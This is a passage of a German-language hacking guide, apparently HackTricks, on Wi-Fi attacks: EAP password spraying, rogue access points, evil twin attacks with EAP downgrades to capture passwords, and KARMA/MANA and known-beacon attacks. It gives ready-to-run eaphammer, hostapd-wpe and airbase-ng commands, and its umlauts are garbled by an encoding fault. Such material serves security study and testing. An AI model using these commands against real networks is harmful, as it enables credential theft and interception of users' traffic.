
Unabh√§ngig vom gew√§hlten Protokoll erlangt der PEAP/TTLS-Server Kenntnis von der wahren Identit√§t des Benutzers, nachdem der TLS-Tunnel eingerichtet wurde. Die wahre Identit√§t kann als user@realm oder einfach user dargestellt werden. Wenn der PEAP/TTLS-Server auch f√ºr die Authentifizierung des Benutzers verantwortlich ist, besitzt er nun die Identit√§t des Benutzers und f√§hrt mit der durch den TLS-Tunnel gesch√ºtzten Authentifizierungsmethode fort. Alternativ kann der PEAP/TTLS-Server eine neue RADIUS-Anfrage an den Heim-RADIUS-Server des Benutzers weiterleiten. Diese neue RADIUS-Anfrage l√§sst die PEAP- oder TTLS-Protokollebene weg. In F√§llen, in denen die gesch√ºtzte Authentifizierungsmethode EAP ist, werden die inneren EAP-Nachrichten ohne die EAP-PEAP- oder EAP-TTLS-H√ºlle an den Heim-RADIUS-Server √ºbertragen. Das User-Name-Attribut der ausgehenden RADIUS-Nachricht enth√§lt die wahre Identit√§t des Benutzers und ersetzt den anonymen User-Name aus der eingehenden RADIUS-Anfrage. Wenn die gesch√ºtzte Authentifizierungsmethode PAP oder CHAP (nur von TTLS unterst√ºtzt) ist, werden das User-Name-Attribut und andere Authentifizierungsattribute, die aus der TLS-Nutzlast extrahiert wurden, in der ausgehenden RADIUS-Nachricht ersetzt, wodurch der anonyme User-Name und die TTLS EAP-Message-Attribute aus der eingehenden RADIUS-Anfrage verdr√§ngt werden.

F√ºr weitere Informationen siehe [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Wenn vom Client erwartet wird, dass er einen **Benutzernamen und ein Passwort** verwendet (beachten Sie, dass **EAP-TLS in diesem Fall nicht g√ºltig sein wird**), dann k√∂nnten Sie versuchen, eine **Liste** von **Benutzernamen** (siehe n√§chsten Teil) und **Passw√∂rtern** zu erhalten und versuchen, den Zugang mit [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)** zu **bruteforcen**.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Du k√∂nntest diesen Angriff auch mit `eaphammer` durchf√ºhren:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client-Angriffe Theorie

### Netzwerk Auswahl und Roaming

* Das 802.11-Protokoll definiert, wie eine Station einem Extended Service Set (ESS) beitritt, spezifiziert jedoch nicht die Kriterien zur Auswahl eines ESS oder eines Access Points (AP) innerhalb davon.
* Stationen k√∂nnen zwischen APs, die dasselbe ESSID teilen, umherwandern und die Konnektivit√§t √ºber ein Geb√§ude oder Gebiet aufrechterhalten.
* Das Protokoll erfordert die Authentifizierung der Station zum ESS, schreibt jedoch keine Authentifizierung des APs zur Station vor.

### Bevorzugte Netzwerklisten (PNLs)

* Stationen speichern die ESSID jedes drahtlosen Netzwerks, mit dem sie sich verbinden, in ihrer Bevorzugten Netzwerk Liste (PNL), zusammen mit netzwerkspezifischen Konfigurationsdetails.
* Die PNL wird verwendet, um automatisch eine Verbindung zu bekannten Netzwerken herzustellen, was die Benutzererfahrung verbessert, indem der Verbindungsprozess optimiert wird.

### Passive Scans

* APs senden regelm√§√üig Beacon-Frames aus, die ihre Pr√§senz und Merkmale ank√ºndigen, einschlie√ülich der ESSID des APs, es sei denn, das Broadcasting ist deaktiviert.
* W√§hrend des passiven Scannens lauschen Stationen auf Beacon-Frames. Wenn die ESSID eines Beacons mit einem Eintrag in der PNL der Station √ºbereinstimmt, kann die Station automatisch eine Verbindung zu diesem AP herstellen.
* Das Wissen um die PNL eines Ger√§ts erm√∂glicht potenzielle Ausnutzung, indem die ESSID eines bekannten Netzwerks nachgeahmt wird, um das Ger√§t dazu zu bringen, sich mit einem b√∂sartigen AP zu verbinden.

### Aktives Probing

* Aktives Probing beinhaltet, dass Stationen Probe-Anfragen senden, um nahegelegene APs und deren Eigenschaften zu entdecken.
* Gezielt gerichtete Probe-Anfragen zielen auf eine bestimmte ESSID ab und helfen festzustellen, ob ein bestimmtes Netzwerk in Reichweite ist, selbst wenn es sich um ein verborgenes Netzwerk handelt.
* Broadcast-Probe-Anfragen haben ein leeres SSID-Feld und werden an alle nahegelegenen APs gesendet, sodass die Station nach einem bevorzugten Netzwerk suchen kann, ohne den Inhalt ihrer PNL offenzulegen.

## Einfacher AP mit Umleitung ins Internet

Bevor erkl√§rt wird, wie man komplexere Angriffe durchf√ºhrt, wird erkl√§rt, **wie** man einfach einen **AP** **erstellen** und seinen **Verkehr** an eine Schnittstelle umleiten kann, die mit dem **Internet** verbunden ist.

Verwenden Sie `ifconfig -a`, um zu √ºberpr√ºfen, ob die wlan-Schnittstelle zum Erstellen des AP und die Schnittstelle, die mit dem Internet verbunden ist, vorhanden sind.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Erstellen Sie die Konfigurationsdatei `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dann **setze IPs** und **Routen**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Und dann **starte** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Erstellen Sie eine Konfigurationsdatei `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stoppen Sie st√∂rende Prozesse**, setzen Sie **√úberwachungsmodus** und **starten Sie hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Weiterleitung und Umleitung
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Ein Evil Twin-Angriff nutzt die Art und Weise aus, wie WiFi-Clients Netzwerke erkennen, wobei haupts√§chlich der Netzwerkname (ESSID) verwendet wird, ohne dass die Basisstation (Zugangspunkt) sich gegen√ºber dem Client authentifizieren muss. Wichtige Punkte sind:

* **Schwierigkeit bei der Unterscheidung**: Ger√§te haben Schwierigkeiten, zwischen legitimen und b√∂sartigen Zugangspunkten zu unterscheiden, wenn sie denselben ESSID und denselben Verschl√ºsselungstyp verwenden. In der realen Welt verwenden Netzwerke oft mehrere Zugangspunkte mit demselben ESSID, um die Abdeckung nahtlos zu erweitern.
* **Client-Roaming und Verbindungsmanipulation**: Das 802.11-Protokoll erm√∂glicht es Ger√§ten, zwischen Zugangspunkten innerhalb desselben ESS zu wechseln. Angreifer k√∂nnen dies ausnutzen, indem sie ein Ger√§t dazu verleiten, sich von seiner aktuellen Basisstation zu trennen und sich mit einem b√∂sartigen zu verbinden. Dies kann erreicht werden, indem ein st√§rkeres Signal angeboten oder die Verbindung zum legitimen Zugangspunkt durch Methoden wie Deauthentifizierungs-Pakete oder St√∂rungen unterbrochen wird.
* **Herausforderungen bei der Ausf√ºhrung**: Die erfolgreiche Durchf√ºhrung eines Evil Twin-Angriffs in Umgebungen mit mehreren, gut platzierten Zugangspunkten kann herausfordernd sein. Das Deauthentifizieren eines einzelnen legitimen Zugangspunkts f√ºhrt oft dazu, dass das Ger√§t sich mit einem anderen legitimen Zugangspunkt verbindet, es sei denn, der Angreifer kann alle nahegelegenen Zugangspunkte deauthentifizieren oder den b√∂sartigen Zugangspunkt strategisch platzieren.

Sie k√∂nnen einen sehr einfachen Open Evil Twin (ohne die F√§higkeit, den Datenverkehr ins Internet zu leiten) erstellen, indem Sie:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Du k√∂nntest auch einen Evil Twin mit **eaphammer** erstellen (beachte, dass die Schnittstelle **NICHT** im **Monitor**-Modus sein **sollte**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oder mit Airgeddon: `Optionen: 5,6,7,8,9 (im Evil Twin Angriffsmen√º).`

![](<../../.gitbook/assets/image (1088).png>)

Bitte beachten Sie, dass standardm√§√üig, wenn ein ESSID in der PNL als WPA-gesch√ºtzt gespeichert ist, das Ger√§t sich nicht automatisch mit einem offenen Evil Twin verbindet. Sie k√∂nnen versuchen, den echten AP zu DoS'en und hoffen, dass der Benutzer manuell mit Ihrem offenen Evil Twin verbindet, oder Sie k√∂nnten den echten AP DoS'en und einen WPA Evil Twin verwenden, um den Handshake zu erfassen (mit dieser Methode k√∂nnen Sie den Opfer nicht zu sich verbinden lassen, da Sie den PSK nicht kennen, aber Sie k√∂nnen den Handshake erfassen und versuchen, ihn zu knacken).

_Einige Betriebssysteme und Antivirenprogramme warnen den Benutzer, dass die Verbindung zu einem offenen Netzwerk gef√§hrlich ist..._

### WPA/WPA2 Evil Twin

Sie k√∂nnen einen **Evil Twin mit WPA/2** erstellen, und wenn die Ger√§te so konfiguriert sind, dass sie sich mit diesem SSID √ºber WPA/2 verbinden, werden sie versuchen, sich zu verbinden. Jedenfalls m√ºssen Sie **auch wissen**, das **Passwort**, das der Client verwenden wird, um den **4-Wege-Handshake** abzuschlie√üen. Wenn Sie es **nicht wissen**, wird die **Verbindung nicht abgeschlossen**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Um diese Angriffe zu verstehen, empfehle ich, vorher die kurze [WPA Enterprise Erkl√§rung](./#wpa-enterprise-mgt) zu lesen.

**Verwendung von hostapd-wpe**

`hostapd-wpe` ben√∂tigt eine **Konfigurations**datei, um zu funktionieren. Um die Erstellung dieser Konfigurationen zu **automatisieren**, k√∂nnten Sie [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) verwenden (laden Sie die Python-Datei im _/etc/hostapd-wpe/_ herunter).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In der Konfigurationsdatei k√∂nnen Sie viele verschiedene Dinge ausw√§hlen, wie ssid, Kanal, Benutzerdateien, cret/key, dh-Parameter, wpa-Version und Auth...

[**Verwendung von hostapd-wpe mit EAP-TLS, um jede Zertifikat-Anmeldung zu erm√∂glichen.**](evil-twin-eap-tls.md)

**Verwendung von EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standardm√§√üig bietet EAPHammer diese Authentifizierungsmethoden an (beachten Sie GTC als die erste, die versucht, Klartextpassw√∂rter zu erhalten, und dann die Verwendung robusterer Auth-Methoden):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dies ist die Standardmethodik, um lange Verbindungszeiten zu vermeiden. Sie k√∂nnen jedoch auch angeben, die Authentifizierungsmethoden vom schw√§chsten zum st√§rksten zu servieren:
```
--negotiate weakest
```
Oder Sie k√∂nnten auch verwenden:

* `--negotiate gtc-downgrade`, um eine hocheffiziente GTC-Downgrade-Implementierung (Klartext-Passw√∂rter) zu verwenden
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP`, um die angebotenen Methoden manuell anzugeben (wenn die gleichen Authentifizierungsmethoden in der gleichen Reihenfolge wie die Organisation angeboten werden, wird der Angriff viel schwieriger zu erkennen sein).
* [Weitere Informationen im Wiki finden](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Verwendung von Airgeddon**

`Airgeddon` kann zuvor generierte Zertifikate verwenden, um EAP-Authentifizierung f√ºr WPA/WPA2-Enterprise-Netzwerke anzubieten. Das gef√§lschte Netzwerk wird das Verbindungsprotokoll auf EAP-MD5 herabstufen, sodass es in der Lage ist, **den Benutzer und das MD5 des Passworts zu erfassen**. Sp√§ter kann der Angreifer versuchen, das Passwort zu knacken.\
`Airgeddon` bietet Ihnen die M√∂glichkeit eines **kontinuierlichen Evil Twin-Angriffs (laut)** oder **nur den Evil Attack zu erstellen, bis sich jemand verbindet (sanft).**

![](<../../.gitbook/assets/image (936).png>)

### Debugging von PEAP und EAP-TTLS TLS-Tunneln in Evil Twin-Angriffen

_Diese Methode wurde in einer PEAP-Verbindung getestet, aber da ich einen beliebigen TLS-Tunnel entschl√ºssele, sollte dies auch mit EAP-TTLS funktionieren._

Innerhalb der **Konfiguration** von _hostapd-wpe_ **kommentieren** Sie die Zeile, die _**dh\_file**_ enth√§lt (von `dh_file=/etc/hostapd-wpe/certs/dh` zu `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dies wird `hostapd-wpe` dazu bringen, **Schl√ºssel mit RSA auszutauschen** anstelle von DH, sodass Sie den Datenverkehr sp√§ter **entschl√ºsseln** k√∂nnen, **wenn Sie den privaten Schl√ºssel des Servers kennen**.

Starten Sie nun den **Evil Twin** mit **`hostapd-wpe`** mit dieser modifizierten Konfiguration wie gewohnt. Starten Sie auch **`wireshark`** in der **Schnittstelle**, die den Evil Twin-Angriff durchf√ºhrt.

Jetzt oder sp√§ter (wenn Sie bereits einige Authentifizierungsversuche erfasst haben) k√∂nnen Sie den privaten RSA-Schl√ºssel in Wireshark hinzuf√ºgen unter: `Bearbeiten --> Einstellungen --> Protokolle --> TLS --> (RSA-Schl√ºsselliste) Bearbeiten...`

F√ºgen Sie einen neuen Eintrag hinzu und f√ºllen Sie das Formular mit diesen Werten aus: **IP-Adresse = beliebig** -- **Port = 0** -- **Protokoll = Daten** -- **Schl√ºsseldatei** (**w√§hlen Sie Ihre Schl√ºsseldatei aus**, um Probleme zu vermeiden, w√§hlen Sie eine Schl√ºsseldatei **ohne Passwortschutz**).

![](<../../.gitbook/assets/image (687).png>)

Und schauen Sie sich die neue **"Entschl√ºsselte TLS"-Registerkarte** an:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Lautes MANA und Bekannte Beacon-Angriffe

### ESSID- und MAC-Blacklist/Whitelist

Verschiedene Arten von Media Access Control Filterlisten (MFACLs) und deren entsprechende Modi und Auswirkungen auf das Verhalten eines b√∂sartigen Access Points (AP):

1. **MAC-basierte Whitelist**:
* Der b√∂sartige AP antwortet nur auf Probeanforderungen von Ger√§ten, die in der Whitelist angegeben sind, und bleibt f√ºr alle anderen, die nicht aufgef√ºhrt sind, unsichtbar.
2. **MAC-basierte Blacklist**:
* Der b√∂sartige AP ignoriert Probeanforderungen von Ger√§ten auf der Blacklist, wodurch der b√∂sartige AP f√ºr diese spezifischen Ger√§te unsichtbar wird.
3. **SSID-basierte Whitelist**:
* Der b√∂sartige AP antwortet nur auf Probeanforderungen f√ºr spezifische ESSIDs, die aufgelistet sind, und wird f√ºr Ger√§te, deren Bevorzugte Netzwerklisten (PNLs) diese ESSIDs nicht enthalten, unsichtbar.
4. **SSID-basierte Blacklist**:
* Der b√∂sartige AP antwortet nicht auf Probeanforderungen f√ºr die spezifischen ESSIDs auf der Blacklist, wodurch er f√ºr Ger√§te, die nach diesen bestimmten Netzwerken suchen, unsichtbar wird.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Diese Methode erm√∂glicht es einem **Angreifer, einen b√∂sartigen Access Point (AP) zu erstellen, der auf alle Probeanfragen** von Ger√§ten reagiert, die versuchen, sich mit Netzwerken zu verbinden. Diese Technik **t√§uscht Ger√§te, indem sie sie dazu bringt, sich mit dem AP des Angreifers zu verbinden**, indem sie die Netzwerke imitiert, nach denen die Ger√§te suchen. Sobald ein Ger√§t eine Verbindungsanfrage an diesen b√∂sartigen AP sendet, wird die Verbindung hergestellt, was dazu f√ºhrt, dass das Ger√§t f√§lschlicherweise mit dem Netzwerk des Angreifers verbunden wird.

### MANA

Dann **begannen Ger√§te, unaufgeforderte Netzwerkantworten zu ignorieren**, was die Effektivit√§t des urspr√ºnglichen Karma-Angriffs verringerte. Eine neue Methode, bekannt als der **MANA-Angriff**, wurde jedoch von Ian de Villiers und Dominic White eingef√ºhrt. Diese Methode beinhaltet, dass der b√∂sartige AP **die Bevorzugten Netzwerklisten (PNL) von Ger√§ten erfasst, indem er auf deren Broadcast-Probeanfragen** mit Netzwerknamen (SSIDs) antwortet, die zuvor von den Ger√§ten angefordert wurden. Dieser ausgekl√ºgelte Angriff umgeht die Schutzma√ünahmen gegen den urspr√ºnglichen Karma-Angriff, indem er die Art und Weise ausnutzt, wie Ger√§te bekannte Netzwerke speichern und priorisieren.

Der MANA-Angriff funktioniert, indem er sowohl gerichtete als auch Broadcast-Probeanfragen von Ger√§ten √ºberwacht. Bei gerichteten Anfragen zeichnet er die MAC-Adresse des Ger√§ts und den angeforderten Netzwerknamen auf und f√ºgt diese Informationen einer Liste hinzu. Wenn eine Broadcast-Anfrage empfangen wird, antwortet der AP mit Informationen, die mit einem der Netzwerke auf der Liste des Ger√§ts √ºbereinstimmen, und verleitet das Ger√§t dazu, sich mit dem b√∂sartigen AP zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Ein **Loud MANA-Angriff** ist eine fortgeschrittene Strategie, wenn Ger√§te kein gezieltes Probing verwenden oder wenn ihre Preferred Network Lists (PNL) dem Angreifer unbekannt sind. Er basiert auf dem Prinzip, dass **Ger√§te im selben Bereich wahrscheinlich einige Netzwerknamen in ihren PNLs teilen**. Anstatt selektiv zu antworten, sendet dieser Angriff Probe-Antworten f√ºr jeden Netzwerknamen (ESSID), der in den kombinierten PNLs aller beobachteten Ger√§te gefunden wird. Dieser breite Ansatz erh√∂ht die Wahrscheinlichkeit, dass ein Ger√§t ein bekanntes Netzwerk erkennt und versucht, sich mit dem b√∂sartigen Access Point (AP) zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Bekannter Beacon-Angriff

Wenn der **Loud MANA Angriff** m√∂glicherweise nicht ausreicht, bietet der **Bekannte Beacon-Angriff** einen weiteren Ansatz. Diese Methode **brute-forced den Verbindungsprozess, indem sie einen AP simuliert, der auf jeden Netzwerknamen reagiert und durch eine Liste potenzieller ESSIDs aus einer Wortliste zirkuliert**. Dies simuliert die Anwesenheit zahlreicher Netzwerke, in der Hoffnung, eine ESSID innerhalb der PNL des Opfers zu treffen, was einen Verbindungsversuch zum gef√§lschten AP ausl√∂st. Der Angriff kann verst√§rkt werden, indem er mit der `--loud` Option kombiniert wird, um einen aggressiveren Versuch zu unternehmen, Ger√§te zu fangen.

Eaphammer hat diesen Angriff als MANA-Angriff implementiert, bei dem alle ESSIDs in einer Liste geladen werden (Sie k√∂nnten dies auch mit `--loud` kombinieren, um einen Loud MANA + Bekannte Beacons Angriff zu erstellen):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Bekannter Beacon Burst Angriff**

Der **Bekannte Beacon Burst Angriff** beinhaltet **schnelles Senden von Beacon-Frames f√ºr jede ESSID, die in einer Datei aufgef√ºhrt ist**. Dies schafft eine dichte Umgebung von gef√§lschten Netzwerken, was die Wahrscheinlichkeit erh√∂ht, dass Ger√§te sich mit dem b√∂sartigen AP verbinden, insbesondere in Kombination mit einem MANA-Angriff. Diese Technik nutzt Geschwindigkeit und Volumen, um die Netzwerk-Auswahlmechanismen der Ger√§te zu √ºberw√§ltigen.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ist ein Protokoll, das es Ger√§ten erm√∂glicht, sich direkt √ºber Wi-Fi miteinander zu verbinden, ohne dass ein traditioneller drahtloser Zugangspunkt erforderlich ist. Diese F√§higkeit ist in verschiedenen Internet of Things (IoT)-Ger√§ten integriert, wie Druckern und Fernsehern, und erleichtert die direkte Kommunikation zwischen Ger√§ten. Ein bemerkenswertes Merkmal von Wi-Fi Direct ist, dass ein Ger√§t die Rolle eines Zugangspunkts √ºbernimmt, bekannt als der Gruppenbesitzer, um die Verbindung zu verwalten.

Die Sicherheit f√ºr Wi-Fi Direct-Verbindungen wird durch **Wi-Fi Protected Setup (WPS)** gew√§hrleistet, das mehrere Methoden f√ºr eine sichere Kopplung unterst√ºtzt, darunter:

* **Push-Button Configuration (PBC)**
* **PIN-Eingabe**
* **Near-Field Communication (NFC)**

Diese Methoden, insbesondere die PIN-Eingabe, sind anf√§llig f√ºr die gleichen Schwachstellen wie WPS in traditionellen Wi-Fi-Netzwerken, was sie zu Zielen f√ºr √§hnliche Angriffsvektoren macht.

### EvilDirect Hijacking

**EvilDirect Hijacking** ist ein Angriff, der spezifisch auf Wi-Fi Direct abzielt. Er spiegelt das Konzept eines Evil Twin-Angriffs wider, zielt jedoch auf Wi-Fi Direct-Verbindungen ab. In diesem Szenario gibt sich ein Angreifer als legitimer Gruppenbesitzer aus, um Ger√§te zu t√§uschen, sich mit einer b√∂sartigen Entit√§t zu verbinden. Diese Methode kann mit Tools wie `airbase-ng` ausgef√ºhrt werden, indem der Kanal, ESSID und die MAC-Adresse des impersonierten Ger√§ts angegeben werden:

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Schau dir [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) an (Login mit Facebook und Imitation von WPA in Captive Portalen)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Tritt dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Engagiere dich mit Inhalten, die in die Aufregung und Herausforderungen des Hackens eintauchen

**Echtzeit-Hack-Nachrichten**\
Bleibe auf dem Laufenden mit der schnelllebigen Hack-Welt durch Echtzeit-Nachrichten und Einblicke

**Neueste Ank√ºndigungen**\
Bleibe informiert √ºber die neuesten Bug-Bounties und wichtige Plattform-Updates

**Tritt uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginne noch heute mit den besten Hackern zusammenzuarbeiten!

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
